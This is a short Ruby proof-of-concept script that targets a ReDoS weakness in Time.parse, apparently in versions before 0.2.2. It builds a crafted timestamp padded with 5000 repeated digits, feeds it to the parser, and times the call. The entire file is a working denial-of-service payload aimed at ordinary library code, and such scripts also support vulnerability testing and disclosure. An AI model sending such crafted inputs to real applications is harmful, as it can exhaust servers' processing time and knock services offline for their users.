require 'time'

# Vulnerable Time parsing function (before version 0.2.2)
vulnerable_time_parse = Time.method(:parse)

# Craft a malicious time string with a repeating pattern that triggers the ReDoS vulnerability
malicious_time = "1970-01-01 " + "1" * 5000 + ":00"

# Measure the time taken to parse the malicious time string
start_time = Time.now
begin
  vulnerable_time_parse.call(malicious_time)
rescue ArgumentError => e
  puts "Caught exception: #{e}"
end
end_time = Time.now

# Output the time taken for the parsing operation
puts "Time taken to parse: #{end_time - start_time} seconds"
